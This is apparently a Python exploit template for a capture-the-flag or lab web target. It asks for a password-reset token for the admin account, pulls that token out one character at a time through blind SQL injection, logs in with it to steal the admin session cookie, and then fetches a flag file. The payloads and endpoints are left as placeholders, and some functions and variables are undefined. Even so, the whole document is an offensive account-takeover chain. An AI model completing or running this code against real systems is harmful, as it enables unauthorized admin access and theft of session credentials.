import sys
import requests
from urllib.parse import urljoin, quote
import argparse
import re

PROXY = {"http": "http://127.0.0.1:8080"}

"""
...
FUNCTIONS HERE IF NEEDED

CREATE USER 

LOGIN 

ETC
...
"""


def GenerateToken(target):
    print("[*] Requesting a token for admin/targeted user")
    url = urljoin(target, "----FIX-ME----") # generate password reset/auth token/magiclink endpoint
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = {"username": "admin"} # username to generate token for (targted username)
    try:
        requests.post(url, headers=headers, data=data, allow_redirects=False)
    except Exception as e:
        print("[-] Error requesting a token for admin/targeted user: ", e)

def sqliExfilTkn(target_base_url, session_token_or_apikey):
    GenerateToken(target_base_url)
    print("[*] Exfiltrating...")
    token_length = ----FIX-ME-INT-VALUE----  # token length
    token = ""
    for pos in range(1, token_length + 1):
        for ascii_code in range(32, 127):
            exfiltration_query = (f"----FIX-ME----") # SQLi payload 
            path = f"/vuln/endpoint/{quote(exfiltration_query)}/fullpath" # vulnerable endpoint with the sqli payload in a parameter or in the url itself (e.g, /vuln/endpoint/{quote(exfiltration_query)}/fullpath)
            url = urljoin(target_base_url, path)
            headers = {"Content-Type": "application/x-www-form-urlencoded"}
            data = {"data": "test"} # any sort of authentication or injection payloads in the body parameters
            try:
                res = requests.post(url, headers=headers, data=data)
            except Exception as e:
                print(f"[-] POST error pos={pos} ascii={ascii_code}:", e)
                continue

            condition = check_condition_function()
            if condition is True:
                token += chr(ascii_code)
                sys.stdout.write(chr(ascii_code))
                sys.stdout.flush()
                # restore the previous status for next char
                # function call here
                break
        else:
            # no ascii matched for this position
            token += "?"
            print(f"\n[-] No char found at position {pos}; inserting '?' and continuing.")
            # restore the previous status for next char
            # function call here

    print(f"\n[+] Admin's Token: {token}")
    return token

def adminLogin(target, tkn):
    url = urljoin(target, f"----FIX-ME----") # token login endpoint 
    try:
        res = requests.get(url, allow_redirects=False)
        if 'Set-Cookie' in res.headers:
            cookie_header = res.headers['Set-Cookie']
            print(f"[+] Admin's Cookies: {cookie_header}")

            match_admin_session = re.search(r'JSESSIONID=([^;]+)', cookie_header)
            if match_admin_session:
                JSESSIONID_value = match_admin_session.group(1)
                if JSESSIONID_value:
                    print("[+] Logged in as admin successfully")
                return JSESSIONID_value
            else:
                print("[-] Could not extract JSESSIONID from cookie")
            return None
    except Exception as e:
        print("[-] Error sending the login request: ", e)

def getLocalTxt(target, admin_session):
    url = urljoin(target, "/flag") # adjust the path if needed
    cookie = {"JSESSIONID": admin_session}
    try:
        res = requests.get(url, cookies=cookie)
        local_txt_flag = res.text
        print(f"[+] local.txt: {local_txt_flag}")
    except Exception as e:
        print("[-] Error sending the flag retrieval request: ", e)

def main():
    parser = argparse.ArgumentParser(description="1")
    parser.add_argument("target", help="Base URL (e.g. http://192.168.xxx.xxx)")
    args = parser.parse_args()


    admin_token = sqliExfilTkn(args.target, session_token_or_apikey)
    if admin_token:
        admin_session_cookie = adminLogin(args.target, admin_token)
        if admin_session_cookie:
            getLocalTxt(args.target, admin_session_cookie)

if __name__ == "__main__":
    main()
